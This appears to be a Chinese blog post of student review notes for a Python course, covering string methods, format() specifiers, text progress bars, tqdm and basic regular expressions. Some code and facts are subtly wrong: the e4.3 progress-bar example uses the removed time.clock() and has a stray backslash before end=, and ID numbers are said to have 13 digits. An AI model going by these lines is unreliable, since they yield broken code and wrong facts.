<p><img src="/2025/06/17/Python%E9%AB%98%E7%BA%A7%E8%AF%AD%E8%A8%80%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/image%2046.png" alt="image.png"></p>
<p>按照关键词插入：</p>
<p><img src="/2025/06/17/Python%E9%AB%98%E7%BA%A7%E8%AF%AD%E8%A8%80%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/image%2047.png" alt="image.png"></p>
<h3 id="format-方法的格式控制"><a href="#format-方法的格式控制" class="headerlink" title="format()方法的格式控制"></a>format()方法的格式控制</h3><p>槽内部对格式化的配置方式。{ &lt;参数序号&gt; ： &lt;格式控制标记&gt;}</p>
<p><img src="/2025/06/17/Python%E9%AB%98%E7%BA%A7%E8%AF%AD%E8%A8%80%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/image%2048.png" alt="image.png"></p>
<p><img src="/2025/06/17/Python%E9%AB%98%E7%BA%A7%E8%AF%AD%E8%A8%80%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/image%2049.png" alt="image.png"></p>
<p><img src="/2025/06/17/Python%E9%AB%98%E7%BA%A7%E8%AF%AD%E8%A8%80%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/image%2050.png" alt="image.png"></p>
<p><strong>时间</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;hello world&quot;</span>+<span class="built_in">str</span>(i)+<span class="string">&quot;\r&quot;</span>,end=<span class="string">&quot;&quot;</span>)</span><br><span class="line">    <span class="comment">#print(&quot;hello world&quot; + str(i) + &quot;\r&quot;, end=&quot;&quot;,flush=True)</span></span><br><span class="line">    time.sleep(<span class="number">5</span>)</span><br></pre></td></tr></table></figure>

<p><strong>笔记草稿</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">content=<span class="string">&#x27;你的表现真不错👍🏿&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(content))</span><br><span class="line"><span class="built_in">print</span>(content[-<span class="number">1</span>])</span><br><span class="line"></span><br><span class="line">s=<span class="string">&#x27;👨‍👨‍👧‍👦&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> s:</span><br><span class="line">    <span class="built_in">print</span>(i)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">ord</span>(<span class="string">&#x27;中&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bin</span>(<span class="number">20013</span>))</span><br><span class="line">c=<span class="string">&#x27;1+1=2&#x27;</span>+<span class="built_in">chr</span>(<span class="number">10004</span>)</span><br><span class="line"><span class="built_in">print</span>(c)</span><br><span class="line">d=<span class="string">&#x27;这个字符♏的Unicode值是：&#x27;</span>+<span class="built_in">str</span>(<span class="built_in">ord</span>(<span class="string">&#x27;♏&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(d)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">12</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">chr</span>(<span class="number">9800</span>+i),end=<span class="string">&#x27; &#x27;</span>)</span><br><span class="line"></span><br><span class="line">a=<span class="string">&#x27;absadfdasfadsf&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(a.upper())<span class="comment">#ABSADFDASFADSF</span></span><br><span class="line">b=a.upper()</span><br><span class="line"><span class="built_in">print</span>(b.lower())<span class="comment">#absadfdasfadsf</span></span><br><span class="line">d=<span class="string">&#x27;aa bb cc dd ee&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(d.split(<span class="string">&#x27; &#x27;</span>))<span class="comment">#[&#x27;aa&#x27;, &#x27;bb&#x27;, &#x27;cc&#x27;, &#x27;dd&#x27;, &#x27;ee&#x27;]</span></span><br><span class="line">f=<span class="string">&#x27;aa,bb,cc,dd,ee&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(f.split(<span class="string">&#x27;,&#x27;</span>))<span class="comment">#[&#x27;aa&#x27;, &#x27;bb&#x27;, &#x27;cc&#x27;, &#x27;dd&#x27;, &#x27;ee&#x27;]</span></span><br><span class="line">s=<span class="string">&#x27;  hello  world  &#x27;</span></span><br><span class="line"><span class="built_in">print</span>(s.split(<span class="string">&quot; &quot;</span>))<span class="comment">#[&#x27;&#x27;, &#x27;&#x27;, &#x27;hello&#x27;, &#x27;&#x27;, &#x27;world&#x27;, &#x27;&#x27;, &#x27;&#x27;]</span></span><br><span class="line">t=<span class="string">&#x27;##hello###world##&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(t.split(<span class="string">&quot;#&quot;</span>))<span class="comment">#[&#x27;&#x27;, &#x27;&#x27;, &#x27;hello&#x27;, &#x27;&#x27;, &#x27;&#x27;, &#x27;world&#x27;, &#x27;&#x27;, &#x27;&#x27;]</span></span><br><span class="line"><span class="built_in">print</span>(t.split(<span class="string">&quot;##&quot;</span>))<span class="comment">#[&#x27;&#x27;, &#x27;hello&#x27;, &#x27;#world&#x27;, &#x27;&#x27;]</span></span><br><span class="line">q=<span class="string">&#x27;###hello#####world###&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(q.split(<span class="string">&quot;###&quot;</span>))<span class="comment">#[&#x27;&#x27;, &#x27;hello&#x27;, &#x27;##world&#x27;, &#x27;&#x27;]</span></span><br><span class="line"><span class="built_in">print</span>(q.replace(<span class="string">&quot;#&quot;</span>,<span class="string">&quot;o&quot;</span>))<span class="comment">#ooohellooooooworldooo</span></span><br><span class="line">w=<span class="string">&#x27;hello world&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(w.split(<span class="string">&#x27; &#x27;</span>))<span class="comment">#[&#x27;hello&#x27;, &#x27;world&#x27;]</span></span><br><span class="line">x=<span class="string">&#x27;hello&#x27;</span><span class="built_in">print</span>(x.center(<span class="number">20</span>,<span class="string">&quot;*&quot;</span>))<span class="comment">#*******hello********</span></span><br><span class="line">y=<span class="string">&#x27; hello     world &#x27;</span><span class="built_in">print</span>(y.split(<span class="string">&#x27; &#x27;</span>))<span class="comment">#[&#x27;&#x27;, &#x27;hello&#x27;, &#x27;&#x27;, &#x27;&#x27;, &#x27;&#x27;, &#x27;&#x27;, &#x27;world&#x27;, &#x27;&#x27;]</span></span><br><span class="line"><span class="built_in">print</span>(y.strip())<span class="comment">#hello     world</span></span><br><span class="line">a=<span class="string">&#x27;pythonpython==&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(a.strip(<span class="string">&#x27;py=&#x27;</span>))<span class="comment">#thonpython</span></span><br><span class="line">li=<span class="string">&#x27;12345&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(li.join(<span class="string">&#x27; &#x27;</span>))<span class="comment">#&#x27; &#x27;</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27; &#x27;</span>.join(li))<span class="comment">#1 2 3 4 5</span></span><br><span class="line">a=<span class="string">&#x27;test&#x27;</span></span><br><span class="line">b=<span class="string">&#x27;work&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(a+b)<span class="comment">#testwork</span></span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">print</span>(<span class="string">&quot;&#123;&#125;的概率是&#123;&#125;%,这个概率小于阈值&#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="string">&#x27;事件发生&#x27;</span>,<span class="number">95</span>,<span class="number">98</span>))</span><br><span class="line"><span class="comment">#事件发生的概率是95%,这个概率小于阈值98</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;&#123;1&#125;的概率是&#123;2&#125;%,这个概率小于阈值&#123;0&#125;&quot;</span>.<span class="built_in">format</span>(<span class="string">&#x27;事件发生&#x27;</span>,<span class="number">95</span>,<span class="number">98</span>))</span><br><span class="line"><span class="comment">#95的概率是98%,这个概率小于阈值事件发生(结果倒过来，引入第几个参数)</span></span><br></pre></td></tr></table></figure>

<p><strong>课堂事例记录</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">a=<span class="string">&quot;123456789&quot;</span></span><br><span class="line"><span class="built_in">print</span>(a[::<span class="number">2</span>])<span class="comment">#13579</span></span><br><span class="line">text=<span class="string">&quot;My name is &#123;0&#125; and I am &#123;1&#125; years old.&quot;</span>.<span class="built_in">format</span>(<span class="string">&quot;Alice&quot;</span>,<span class="number">25</span>)</span><br><span class="line"><span class="built_in">print</span>(text)<span class="comment">#My name is Alice and I am 25 years old.</span></span><br><span class="line">text=<span class="string">&quot;My name is &#123;name&#125; and I am &#123;age&#125; years old.&quot;</span>.<span class="built_in">format</span>(name=<span class="string">&quot;Alice&quot;</span>,age=<span class="number">25</span>)</span><br><span class="line"><span class="built_in">print</span>(text)<span class="comment">#My name is Alice and I am 25 years old.</span></span><br><span class="line"></span><br><span class="line">content=<span class="string">&quot;&#123;:=^50&#125;&quot;</span>.<span class="built_in">format</span>(<span class="string">&quot;Train&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(content)<span class="comment">#======================Train=======================</span></span><br><span class="line">content=<span class="string">&quot;&#123;:-^50&#125;&quot;</span>.<span class="built_in">format</span>(<span class="string">&quot;Test&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(content)<span class="comment">#-----------------------Test-----------------------</span></span><br><span class="line">content=<span class="string">&quot;&#123;:-^50,&#125;&quot;</span>.<span class="built_in">format</span>(<span class="number">123123123123</span>)</span><br><span class="line"><span class="built_in">print</span>(content)<span class="comment">#-----------------123,123,123,123------------------</span></span><br><span class="line">content=<span class="string">&quot;&#123;:-^50,.2&#125;&quot;</span>.<span class="built_in">format</span>(<span class="number">3.14159265</span>)</span><br><span class="line"><span class="built_in">print</span>(content)<span class="comment">#-----------------------3.1------------------------</span></span><br><span class="line">content=<span class="string">&quot;&#123;:-^50,.2f&#125;&quot;</span>.<span class="built_in">format</span>(<span class="number">3.14159265</span>)</span><br><span class="line"><span class="built_in">print</span>(content)<span class="comment">#-----------------------3.14-----------------------</span></span><br><span class="line">content=<span class="string">&quot;&#123;:-^50,.2e&#125;&quot;</span>.<span class="built_in">format</span>(<span class="number">3.14159265</span>)</span><br><span class="line"><span class="built_in">print</span>(content)<span class="comment">#---------------------3.14e+00---------------------</span></span><br><span class="line">content=<span class="string">&quot;&#123;:-^50,.2E&#125;&quot;</span>.<span class="built_in">format</span>(<span class="number">3.14159265</span>)</span><br><span class="line"><span class="built_in">print</span>(content)<span class="comment">#---------------------3.14E+00---------------------</span></span><br><span class="line">content=<span class="string">&quot;&#123;:-^50,.2%&#125;&quot;</span>.<span class="built_in">format</span>(<span class="number">3.14159265</span>)</span><br><span class="line"><span class="built_in">print</span>(content)<span class="comment">#---------------------314.16%----------------------</span></span><br><span class="line">content=<span class="string">&quot;&#123;:-^50b&#125;&quot;</span>.<span class="built_in">format</span>(<span class="number">16</span>)</span><br><span class="line"><span class="built_in">print</span>(content)<span class="comment">#----------------------10000-----------------------</span></span><br><span class="line">content=<span class="string">&quot;&#123;:-^50d&#125;&quot;</span>.<span class="built_in">format</span>(<span class="number">16</span>)</span><br><span class="line"><span class="built_in">print</span>(content)<span class="comment">#------------------------16------------------------</span></span><br><span class="line">content=<span class="string">&quot;&#123;:-^50o&#125;&quot;</span>.<span class="built_in">format</span>(<span class="number">16</span>)</span><br><span class="line"><span class="built_in">print</span>(content)<span class="comment">#------------------------20------------------------</span></span><br><span class="line">content=<span class="string">&quot;&#123;:-^50x&#125;&quot;</span>.<span class="built_in">format</span>(<span class="number">16</span>)</span><br><span class="line"><span class="built_in">print</span>(content)<span class="comment">#------------------------10------------------------</span></span><br><span class="line">content=<span class="string">&quot;&#123;:-^50X&#125;&quot;</span>.<span class="built_in">format</span>(<span class="number">15</span>)</span><br><span class="line"><span class="built_in">print</span>(content)<span class="comment">#------------------------F-------------------------</span></span><br><span class="line">content=<span class="string">&quot;&#123;:-^50c&#125;&quot;</span>.<span class="built_in">format</span>(<span class="number">97</span>)</span><br><span class="line"><span class="built_in">print</span>(content)<span class="comment">#------------------------a-------------------------</span></span><br><span class="line">content=<span class="string">&quot;&#123;:-^50c&#125; hello world &#123;:-&gt;20c&#125;&quot;</span>.<span class="built_in">format</span>(<span class="number">97</span>,<span class="number">10010</span>)<span class="comment">#&gt;为右对齐</span></span><br><span class="line"><span class="built_in">print</span>(content)<span class="comment">#------------------------a------------------------- hello world -------------------✚</span></span><br><span class="line">content=<span class="string">&quot;&#123;:-^50c&#125; hello world &#123;:+&lt;20c&#125;&quot;</span>.<span class="built_in">format</span>(<span class="number">97</span>,<span class="number">8888</span>)<span class="comment">#&lt;为左对齐</span></span><br><span class="line"><span class="built_in">print</span>(content)<span class="comment">#------------------------a------------------------- hello world ⊸+++++++++++++++++++</span></span><br><span class="line">content=<span class="string">&quot;&#123;1:-^50c&#125; hello world &#123;0:+&lt;20c&#125;&quot;</span>.<span class="built_in">format</span>(<span class="number">97</span>,<span class="number">98</span>)</span><br><span class="line"><span class="built_in">print</span>(content)<span class="comment">#------------------------b------------------------- hello world a+++++++++++++++++++</span></span><br><span class="line"></span><br><span class="line">content=<span class="string">&quot;&#123;0:=^20&#125;&quot;</span>.<span class="built_in">format</span>(<span class="string">&quot;PYTHON&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(content)<span class="comment">#=======PYTHON=======</span></span><br><span class="line">content=<span class="string">&quot;&#123;0:*&gt;20&#125;&quot;</span>.<span class="built_in">format</span>(<span class="string">&quot;BIT&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(content)<span class="comment">#*****************BIT</span></span><br><span class="line">content=<span class="string">&quot;&#123;:10&#125;&quot;</span>.<span class="built_in">format</span>(<span class="string">&quot;BIT&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(content)<span class="comment">#BIT</span></span><br></pre></td></tr></table></figure>

<h2 id="文本进度条"><a href="#文本进度条" class="headerlink" title="文本进度条"></a>文本进度条</h2><h3 id="简单的开始"><a href="#简单的开始" class="headerlink" title="简单的开始"></a>简单的开始</h3><p>利用print()函数实现简单的非刷新文本进度条。</p>
<p>基本思想是按照任务执行百分比将整个任务划分为100个单位，每执行N%输出一次进度条。每一行输出包含进度百分比，代表已完成的部分(**)和未完成的部分(..)的两种字符，以及一个跟随完成度前进的小箭头，风格如下：</p>
<p><img src="/2025/06/17/Python%E9%AB%98%E7%BA%A7%E8%AF%AD%E8%A8%80%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/image%2051.png" alt="image.png"></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#e4.1TextProgressBar.py</span></span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">scale=<span class="number">10</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;------执行开始------&quot;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(scale+<span class="number">1</span>):</span><br><span class="line">    a=<span class="string">&#x27;**&#x27;</span>*i</span><br><span class="line">    b=<span class="string">&#x27;..&#x27;</span>*(scale-i)</span><br><span class="line">    c=(i/scale)*<span class="number">100</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;%&#123;:^3.0f&#125;[&#123;&#125;-&gt;&#123;&#125;]&quot;</span> .<span class="built_in">format</span>(c,a,b))</span><br><span class="line">    time.sleep(<span class="number">0.1</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;------执行结束------&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">输出结果：</span></span><br><span class="line"><span class="string">------执行开始------</span></span><br><span class="line"><span class="string">% 0 [-&gt;....................]</span></span><br><span class="line"><span class="string">%10 [**-&gt;..................]</span></span><br><span class="line"><span class="string">%20 [****-&gt;................]</span></span><br><span class="line"><span class="string">%30 [******-&gt;..............]</span></span><br><span class="line"><span class="string">%40 [********-&gt;............]</span></span><br><span class="line"><span class="string">%50 [**********-&gt;..........]</span></span><br><span class="line"><span class="string">%60 [************-&gt;........]</span></span><br><span class="line"><span class="string">%70 [**************-&gt;......]</span></span><br><span class="line"><span class="string">%80 [****************-&gt;....]</span></span><br><span class="line"><span class="string">%90 [******************-&gt;..]</span></span><br><span class="line"><span class="string">%100[********************-&gt;]</span></span><br><span class="line"><span class="string">------执行结束------</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure>

<h3 id="单行动态刷新"><a href="#单行动态刷新" class="headerlink" title="单行动态刷新"></a>单行动态刷新</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#e4.2TextProgressBar.py</span></span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">101</span>):    </span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;\r&#123;:2&#125;%&quot;</span>.<span class="built_in">format</span>(i), end=<span class="string">&quot;&quot;</span>)    </span><br><span class="line">    time.sleep(<span class="number">0.05</span>)</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">输出结果：</span></span><br><span class="line"><span class="string">  0%  1%  2%  3%  4%  5%  6%  7%  8%  9% 10% 11% 12% 13% 14% 15% 16% </span></span><br><span class="line"><span class="string">  17% 18% 19% 20% 21% 22% 23% 24% 25% 26% 27% 28% 29% 30% 31% 32% 33% </span></span><br><span class="line"><span class="string">  34% 35% 36% 37% 38% 39% 40% 41% 42% 43% 44% 45% 46% 47% 48% 49% 50% </span></span><br><span class="line"><span class="string">  51% 52% 53% 54% 55% 56% 57% 58% 59% 60% 61% 62% 63% 64% 65% 66% 67% </span></span><br><span class="line"><span class="string">  68% 69% 70% 71% 72% 73% 74% 75% 76% 77% 78% 79% 80% 81% 82% 83% 84% </span></span><br><span class="line"><span class="string">  85% 86% 87% 88% 89% 90% 91% 92% 93% 94% 95% 96% 97% 98% 99% 100%</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure>

<p>为什么输出没有单行刷新呢？</p>
<p>这是因为IDLE本身屏蔽了单行刷新功能，如果希望获得刷新效果，请使用控制台命令行执行e4.2TextProgressBar.py程序。以Windows系统为例，启动命令行工具（&lt;Windows系统安装目录&gt;\system32\cmd.exe），选择到e4.2TextProgressBar.py文件所在目录执行</p>
<h3 id="带刷新的文本进度条"><a href="#带刷新的文本进度条" class="headerlink" title="带刷新的文本进度条"></a>带刷新的文本进度条</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#e4.3TextProgressBar.py</span></span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">scale = <span class="number">50</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;执行开始&quot;</span>.center(scale//<span class="number">2</span>,<span class="string">&#x27;-&#x27;</span>))</span><br><span class="line">t = time.clock()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(scale+<span class="number">1</span>):</span><br><span class="line">    a = <span class="string">&#x27;*&#x27;</span> * i</span><br><span class="line">    b = <span class="string">&#x27;.&#x27;</span> * (scale - i)</span><br><span class="line">    c = (i/scale)*<span class="number">100</span></span><br><span class="line">    t -=  time.perf_counter()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;\r&#123;:^3.0f&#125;%[&#123;&#125;-&gt;&#123;&#125;]&#123;:.2f&#125;s&quot;</span>.<span class="built_in">format</span>(c,a,b,-t),\end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    time.sleep(<span class="number">0.05</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;\n&quot;</span>+<span class="string">&quot;执行结束&quot;</span>.center(scale//<span class="number">2</span>,<span class="string">&#x27;-&#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">输出结果：</span></span><br><span class="line"><span class="string">-----------执行开始----------</span></span><br><span class="line"><span class="string">100%[**************************************************-&gt;] 65.71s</span></span><br><span class="line"><span class="string">-----------执行结束----------</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure>

<h3 id="五花八门的进度条设计函数"><a href="#五花八门的进度条设计函数" class="headerlink" title="五花八门的进度条设计函数"></a>五花八门的进度条设计函数</h3><p><img src="/2025/06/17/Python%E9%AB%98%E7%BA%A7%E8%AF%AD%E8%A8%80%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/image%2052.png" alt="image.png"></p>
<h3 id="专门的进度条库tqdm"><a href="#专门的进度条库tqdm" class="headerlink" title="专门的进度条库tqdm"></a>专门的进度条库tqdm</h3><p>Tqdm是python中专门用于处理和实现进度条的库。简单、易用、功能强大。将一个进度条包装在可迭代对象上，显示其执行时间</p>
<p>（1）基本用法</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#最基本的用法</span></span><br><span class="line"><span class="keyword">from</span> tqdm <span class="keyword">import</span> tqdm</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> tqdm(<span class="built_in">range</span>(<span class="number">100</span>)):</span><br><span class="line">    time.sleep(<span class="number">0.1</span>)</span><br></pre></td></tr></table></figure>

<p><strong>（2）tqdm.write()</strong></p>
<p>在tqdm进度条中，直接使用print会打乱排版，tqdm.write()就是解决该问题</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> tqdm(<span class="built_in">range</span>(<span class="number">10</span>)):</span><br><span class="line">    time.sleep(<span class="number">0.5</span>)</span><br><span class="line">    <span class="keyword">if</span> i%<span class="number">2</span>==<span class="number">0</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;阶段性进展&quot;</span>)</span><br></pre></td></tr></table></figure>

<p><strong>（3）tqdm.trange()</strong></p>
<p>Trange()是tqdm(range())的简写形式</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> tqdm <span class="keyword">import</span> trange </span><br><span class="line"><span class="keyword">import</span> time </span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> trange(<span class="number">50</span>, desc=<span class="string">&quot;加载中&quot;</span>, unit=<span class="string">&quot;文件&quot;</span>):   </span><br><span class="line">        time.sleep(<span class="number">0.1</span>)</span><br></pre></td></tr></table></figure>

<p><strong>（4）Tqdm嵌套进度条</strong></p>
<p>支持嵌套进度条，适用于多层循环的场景。Leave参数的作用，表示当前进度条结束之后是否要保留。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> tqdm <span class="keyword">import</span> tqdm</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> tqdm(<span class="built_in">range</span>(<span class="number">5</span>),desc=<span class="string">&quot;外层循环&quot;</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> tqdm(<span class="built_in">range</span>(<span class="number">100</span>),desc=<span class="string">&quot;内层循环&quot;</span>,leave=<span class="literal">False</span>):</span><br><span class="line">        time.sleep(<span class="number">0.01</span>)</span><br></pre></td></tr></table></figure>

<p>Tqdm手动更新进度条：有些不可迭代的对象也需要进度条展示，便可采用手动更新方式</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> tqdm <span class="keyword">import</span> tqdm </span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">with</span> tqdm(total=<span class="number">100</span>) <span class="keyword">as</span> pbar:</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>): </span><br><span class="line">        time.sleep(<span class="number">0.5</span>)</span><br><span class="line">        pbar.update(<span class="number">10</span>)</span><br></pre></td></tr></table></figure>

<h2 id="正则表达式"><a href="#正则表达式" class="headerlink" title="正则表达式"></a>正则表达式</h2><h3 id="正则表达式-1"><a href="#正则表达式-1" class="headerlink" title="正则表达式"></a>正则表达式</h3><p>（1）正则表达式的作用就是从文本中提取特定信息</p>
<p>（2）正则表达式与Python独立</p>
<p>（3）正则表达式在科研、工程、数据挖掘等实践中非常有用。爬虫所获取的数据的解析~</p>
<p>看一个例子：</p>
<blockquote>
<p>大数据项目经理(上海正中能源科技有限公司) 上海正中能源科技有限公司上海2.50万&#x2F;每月<br>大数据项目经理(上海众调信息科技有限公司) 上海众调信息科技有限公司上海1.8万&#x2F;月<br>大数据项目经理（03）(复深蓝软件) 上海复深蓝软件股份有限公司上海0.65万&#x2F;每月<br>393197-大数据精算团队主管(平安医疗健康管理股份有限公司) 平安医疗健康管理股份有限公司上海3.3333万&#x2F;月<br>医疗大数据销售 神州医疗投资有限公司东城区8000万&#x2F;每月<br>393185-大数据运维工程师(平安医疗健康管理股份有限公司) 平安医疗健康管理股份有限公司上海28000万&#x2F;每月</p>
</blockquote>
<p>如何提取公司名称，以及工资金额，例如：上海正中能源科技有限公司2.50万元？</p>
<p><strong>r’([上海|平安].<em>?公司).</em>?([\d.]+万)&#x2F;每{0,1}月’,</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">Lines = content.splitlines()</span><br><span class="line">For I <span class="keyword">in</span> lines:</span><br><span class="line">    寻找  关键词   位置</span><br><span class="line">    如果存在，则……</span><br><span class="line">    如果不存在，则 <span class="keyword">continue</span></span><br></pre></td></tr></table></figure>

<p><img src="/2025/06/17/Python%E9%AB%98%E7%BA%A7%E8%AF%AD%E8%A8%80%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/image%2053.png" alt="image.png"></p>
<p>正则表达式，就是高效处理上述问题的有力工具。其核心就是“模式匹配”</p>
<h3 id="正则表达式的常见语法"><a href="#正则表达式的常见语法" class="headerlink" title="正则表达式的常见语法"></a>正则表达式的常见语法</h3><p>正则表达式中包括了【普通字符】和【特殊字符】</p>
<p><strong>普通字符</strong>：没有特殊含义，如月&#x2F;每&#x2F;元</p>
<p><strong>特殊字符</strong>：在正则表达式语法中承担特殊功能的字符，如 * ? []</p>
<p><strong>（1）.  表示匹配除了换行符之外的任意单个字符</strong></p>
<p>苹果是红色</p>
<p>香蕉是黄色</p>
<p>乌鸦是黑色</p>
<p>橙子是黄色</p>
<p>过程：</p>
<p>定义变量  content &#x3D; “源字符串”</p>
<p>导入库  import re</p>
<p>定义模式  p &#x3D; re.compile(r’.色’)</p>
<p>遍历文字  for one in p.findall(content):</p>
<p>得到结果  print(one)</p>
<p><strong>（2）*表示匹配前面出现的字符或者表达式任意次数【可以是0次】</strong></p>
<p>苹果，是红色的</p>
<p>香蕉，是黄色的</p>
<p>乌鸦，是黑色的</p>
<p>橙子，是黄色的</p>
<p><strong>目标：匹配逗号后面的内容，包括逗号本身</strong></p>
<p>**,.<em>（最常见的组合），苹果是绿色色色色色色色的</em>*</p>
<p>*紧跟在.后面，表示任意字符可以出现任意多次</p>
<p><strong>（3）+表示匹配前面出现的字符或者表达式一次或者多次【不能是0次】</strong></p>
<p>苹果，是红色的</p>
<p>香蕉，是黄色的</p>
<p>乌鸦，是黑色的</p>
<p>橙子，是黄色的</p>
<p><strong>目标：绿色+</strong></p>
<p><strong>苹果是绿色色色色色色色的</strong></p>
<p><strong>绿</strong></p>
<p>*紧跟在.后面，表示任意字符可以出现任意多次</p>
<p><strong>（4）花括号{} 表示匹配前面出现的字符或者表达式指定次数</strong></p>
<p>苹果，是红色的</p>
<p>香蕉，是黄色的</p>
<p>乌鸦，是黑色的</p>
<p>橙子，是黄色的</p>
<p><strong>示例：红彤彤，绿油油，黑乎乎，白茫茫，粉噗噗噗噗噗噗噗</strong></p>
<p><strong>匹配文本中的“噗”至少出现3次，最多出现7次</strong></p>
<p><strong>粉噗{3,7}  粉噗{7}</strong></p>
<p>最常用的场景，就是手机号（连续11位），身份证号（连续13位）</p>
<p>（5）<strong>区分贪婪模式与非贪婪模式</strong></p>
<p><img src="/2025/06/17/Python%E9%AB%98%E7%BA%A7%E8%AF%AD%E8%A8%80%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/80bab756-2a1a-40a7-9b8c-02170427c41b.png" alt="image.png"></p>
<p>（6）对特殊字符的转义</p>
<p><img src="/2025/06/17/Python%E9%AB%98%E7%BA%A7%E8%AF%AD%E8%A8%80%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/3f07fb24-b7c4-4e4d-9c8f-e5b644eb350b.png" alt="image.png"></p>
<p>（7）用反斜杠匹配某种字符类型</p>
